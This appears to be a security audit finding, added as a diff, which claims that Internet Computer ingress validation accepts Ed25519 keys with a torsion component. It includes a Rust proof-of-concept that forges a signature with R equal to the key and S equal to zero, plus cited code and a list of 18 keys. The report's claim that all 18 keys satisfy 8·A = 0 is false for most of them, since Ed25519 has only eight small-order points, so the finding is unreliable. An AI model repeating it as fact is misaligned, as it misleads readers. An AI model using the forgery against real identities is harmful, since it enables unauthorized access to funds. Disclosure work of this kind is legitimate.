@@ -1,0 +1,222 @@
+Audit Report
+
+## Title
+Ed25519 Torsion-Component Key Forgery Bypasses Ingress Authentication — (`rs/crypto/standalone-sig-verifier/src/lib.rs`, `rs/validator/src/ingress_validation.rs`)
+
+## Summary
+`verify_basic_sig_by_public_key` deserializes Ed25519 public keys via `deserialize_raw` without calling `is_torsion_free()`, then verifies using the ZIP215 cofactor-clearing equation. For any of the 18 known torsion-component keys A (where 8·A = 0), the trivial signature (R=A, S=0) satisfies the ZIP215 equation for every possible message. An unprivileged attacker can derive a self-authenticating principal from such a key and submit authenticated ingress messages without possessing any private key.
+
+## Finding Description
+
+`verify_basic_sig_by_public_key` in the standalone sig verifier deserializes the Ed25519 public key with `deserialize_raw` and immediately proceeds to `verify_signature` with no subgroup guard: [1](#0-0) 
+
+`deserialize_raw` explicitly documents that it does not check `is_torsion_free()`: [2](#0-1) 
+
+`verify_signature` uses the ZIP215 cofactor equation `(recomputed_r - sig.r()).mul_by_cofactor().is_identity()`: [3](#0-2) 
+
+**Mathematical proof of forgery:** For a torsion-component key A (8·A = 0) and signature (R=A, S=0):
+- `recomputed_r = [k]·(-A) + [0]·B = -k·A`
+- `(recomputed_r - R).mul_by_cofactor() = (-k·A - A).mul_by_cofactor() = 8·(-(k+1)·A) = -(k+1)·(8·A) = 0`
+
+This holds for **any** message M because k = H(R||A||M) is always multiplied by A, which has order dividing 8.
+
+The ingress path in `user_public_key_from_bytes` also performs no torsion check when parsing the DER key: [4](#0-3) 
+
+The function `verify_public_key` that does enforce `is_torsion_free()` is only referenced in test files — it is never called on the ingress path: [5](#0-4) 
+
+The ingress validation chain `validate_signature_plain` → `verify_basic_sig_by_public_key` never invokes it: [6](#0-5) 
+
+The test suite confirms all 18 torsion-component keys are accepted by `deserialize_raw` and detectable only via the opt-in `is_torsion_free()`: [7](#0-6) 
+
+## Impact Explanation
+An attacker can forge ingress signatures for any of the 18 self-authenticating principals derived from the known torsion keys. The forgery is universal (works for every message) and requires no private key. Any canister that grants permissions to such a principal — including any ICP/cycles/assets sent to the torsion-derived principal — is fully controllable by the attacker. This constitutes unauthorized access to identities and any associated canister-controlled funds, matching the **High** impact class.
+
+## Likelihood Explanation
+The attack requires no privileged access, no private key, no network-level attack, and no threshold corruption. The 18 torsion keys are published in the test suite. The forgery is constructable entirely offline and works for every message, making it repeatable and permanent. The only constraint is that the target principal must be one of the 18 fixed torsion-derived principals.
+
+## Recommendation
+Add an `is_torsion_free()` check in `verify_basic_sig_by_public_key` in `rs/crypto/standalone-sig-verifier/src/lib.rs` immediately after `deserialize_raw`, returning `CryptoError::MalformedPublicKey` if the check fails. Equivalently, add the check in `user_public_key_from_bytes` in `sign_utils.rs` for the Ed25519 branch. The guard already exists and is correct in `verify_public_key` — it is simply not called on the ingress path.
+
+## Proof of Concept
+```rust
+// 1. Pick any torsion key from the published list
+let torsion_key_raw = hex!("c7176a703d4dd84fba3c0b760d10670f2a2053fa2c39ccc64ec7fd7792ac03fa");
+
+// 2. DER-encode it (no validity check performed)
+let der_key = ed25519_public_key_to_der(torsion_key_raw.to_vec());
+
+// 3. Derive self-authenticating principal
+let principal = PrincipalId::new_self_authenticating(&der_key);
+
+// 4. Construct universal forgery: R = torsion_key, S = 0
+let forgery_sig: [u8; 64] = {
+    let mut s = [0u8; 64];
+    s[..32].copy_from_slice(&torsion_key_raw);
+    s
+};
+
+// 5. For ANY message M, verify_basic_sig_by_public_key returns Ok(())
+// because 8*(-(k+1)*A) = 0 for any k when 8*A = 0
+assert!(verify_basic_sig_by_public_key(
+    AlgorithmId::Ed25519,
+    any_message,
+    &forgery_sig,
+    &torsion_key_raw,
+).is_ok());
+
+// Confirm the guard exists but is unused on ingress path:
+assert!(!ic_crypto_ed25519::verify_public_key(&PublicKeyBytes(torsion_key_raw)));
+```
+
+### Citations
+
+**File:** rs/crypto/standalone-sig-verifier/src/lib.rs (L20-43)
+```rust
+        AlgorithmId::Ed25519 => {
+            let pk = ic_ed25519::PublicKey::deserialize_raw(pk_bytes).map_err(|e| {
+                CryptoError::MalformedPublicKey {
+                    algorithm: AlgorithmId::Ed25519,
+                    key_bytes: Some(pk_bytes.to_vec()),
+                    internal_error: e.to_string(),
+                }
+            })?;
+
+            if sig.len() != ic_ed25519::SIGNATURE_BYTES {
+                return Err(CryptoError::MalformedSignature {
+                    algorithm: AlgorithmId::Ed25519,
+                    sig_bytes: sig.to_vec(),
+                    internal_error: "Invalid length".to_string(),
+                });
+            }
+
+            pk.verify_signature(msg, sig)
+                .map_err(|e| CryptoError::SignatureVerification {
+                    algorithm: AlgorithmId::Ed25519,
+                    public_key_bytes: pk.serialize_raw().to_vec(),
+                    sig_bytes: sig.to_vec(),
+                    internal_error: e.to_string(),
+                })
+```
+
+**File:** packages/ic-ed25519/src/lib.rs (L609-631)
+```rust
+    /// Deserialize a public key in raw format
+    ///
+    /// This is just the 32 byte encoding of the public point,
+    /// cooresponding to Self::serialize_raw
+    ///
+    /// # Warning
+    ///
+    /// This does not verify that the key is within the prime order
+    /// subgroup, or that the public key is canonical. To check these
+    /// properties, use is_torsion_free and is_canonical
+    pub fn deserialize_raw(bytes: &[u8]) -> Result<Self, PublicKeyDecodingError> {
+        let bytes = <[u8; Self::BYTES]>::try_from(bytes).map_err(|_| {
+            PublicKeyDecodingError::InvalidKeyEncoding(format!(
+                "Expected key of exactly {} bytes, got {}",
+                Self::BYTES,
+                bytes.len()
+            ))
+        })?;
+        let pk = VerifyingKey::from_bytes(&bytes)
+            .map_err(|e| PublicKeyDecodingError::InvalidKeyEncoding(format!("{e:?}")))?;
+
+        Ok(Self::new(pk))
+    }
+```
+
+**File:** packages/ic-ed25519/src/lib.rs (L709-727)
+```rust
+    pub fn verify_signature(&self, msg: &[u8], signature: &[u8]) -> Result<(), SignatureError> {
+        let signature = Signature::from_slice(signature)?;
+
+        let k = Self::compute_challenge(&signature, self, msg);
+        let minus_a = -self.pk.to_edwards();
+        let recomputed_r =
+            EdwardsPoint::vartime_double_scalar_mul_basepoint(&k, &minus_a, signature.s());
+
+        use curve25519_dalek::traits::IsIdentity;
+
+        if (recomputed_r - signature.r())
+            .mul_by_cofactor()
+            .is_identity()
+        {
+            Ok(())
+        } else {
+            Err(SignatureError::InvalidSignature)
+        }
+    }
+```
+
+**File:** rs/crypto/standalone-sig-verifier/src/sign_utils.rs (L50-62)
+```rust
+    let (key, algorithm_id, content_type) = if pkix_algo_id == ed25519_algorithm_identifier() {
+        (
+            ic_ed25519::PublicKey::deserialize_rfc8410_der(bytes)
+                .map_err(|e| CryptoError::MalformedPublicKey {
+                    algorithm: AlgorithmId::Ed25519,
+                    key_bytes: Some(bytes.to_vec()),
+                    internal_error: format!("{:?}", e),
+                })?
+                .serialize_raw()
+                .to_vec(),
+            AlgorithmId::Ed25519,
+            KeyBytesContentType::Ed25519PublicKeyDer,
+        )
+```
+
+**File:** rs/crypto/internal/crypto_lib/basic_sig/ed25519/src/api.rs (L97-103)
+```rust
+pub fn verify_public_key(pk: &types::PublicKeyBytes) -> bool {
+    if let Ok(pk) = ic_ed25519::PublicKey::deserialize_raw(&pk.0) {
+        pk.is_torsion_free()
+    } else {
+        false
+    }
+}
+```
+
+**File:** rs/validator/src/ingress_validation.rs (L705-713)
+```rust
+fn validate_signature_plain(
+    validator: &dyn IngressSigVerifier,
+    message_id: &MessageId,
+    signature: &BasicSigOf<MessageId>,
+    pubkey: &UserPublicKey,
+) -> Result<(), AuthenticationError> {
+    validator
+        .verify_basic_sig_by_public_key(signature, message_id, pubkey)
+        .map_err(InvalidBasicSignature)
+```
+
+**File:** packages/ic-ed25519/tests/tests.rs (L517-544)
+```rust
+#[test]
+fn public_key_accepts_but_can_detect_keys_with_torsion_component() {
+    const WITH_TORSION: [[u8; 32]; 18] = [
+        hex!("c7176a703d4dd84fba3c0b760d10670f2a2053fa2c39ccc64ec7fd7792ac03fa"),
+        hex!("26e8958fc2b227b045c3f489f2ef98f0d5dfac05d3c63339b13802886d53fc85"),
+        hex!("868b1e2248079aa8e24834a827ae8892ed0c826f87c897893cefffce3ac15242"),
+        hex!("539903bdd44ecf43aa8ddcb730b1170be7879eab807b2f845754aa07001985bf"),
+        hex!("5f44d0277fa2916ae1c7900ad094cff286a8163ee3aa20b4afe2ba91785389d6"),
+        hex!("67867e99109b36830205573bcf3875f947ee473dc0d562786c7240ff8941d04d"),
+        hex!("67fbbe649a6b8337006f8a2778e79d4f4e8e9c0a7042836eeaa60cb118e9841b"),
+        hex!("dda5020fbe04b0ba7449157945718dfe20299f697b39681b03a5d0bec279ffae"),
+        hex!("872d3823dcc001e354b09d618c70b2658cc3700c097514ae125cd14704c35a20"),
+        hex!("92507296f36dd62d42b7e1306b99d02ffe19dea76f69cdaaf7211ce7f6c24fb9"),
+        hex!("b93d302d6a2d629dee6e1415a00651c20e44c2545feb1914d7d41e4eecead522"),
+        hex!("f41202b41dcda6410ffd5b8b5cd492b98986b60964d2f04aa1d963cdee64b7b0"),
+        hex!("97766a5f4da3bb231935496300946d60bfbe04491750d1e23c4c8eceded274f4"),
+        hex!("ae7ab64ec5821986bed36f98d4135cc047c9630c39b61b5f755678f818804eac"),
+        hex!("05dd133d881cc14005f3cca6f5e759a8c7ea0bbfcef222e15bce904c70a4851b"),
+        hex!("02ce23d0c026d9c95aecc36d5f40d7b7f505e29cad9c2014afd1f467ea15cf40"),
+        hex!("ef164a8acaf9fde87b8dffb1b355f3dcefb857d76842720aefc1bfe26a0d9f2e"),
+        hex!("4c95b17aa3870017da2b9e62d09689a8e9bb12a605093cba2fc2df02fde2fdbf"),
+    ];
+
+    for nc in &WITH_TORSION {
+        let k = PublicKey::deserialize_raw(nc).unwrap();
+        assert!(!k.is_torsion_free());
+        assert!(k.is_canonical());
+    }
+```
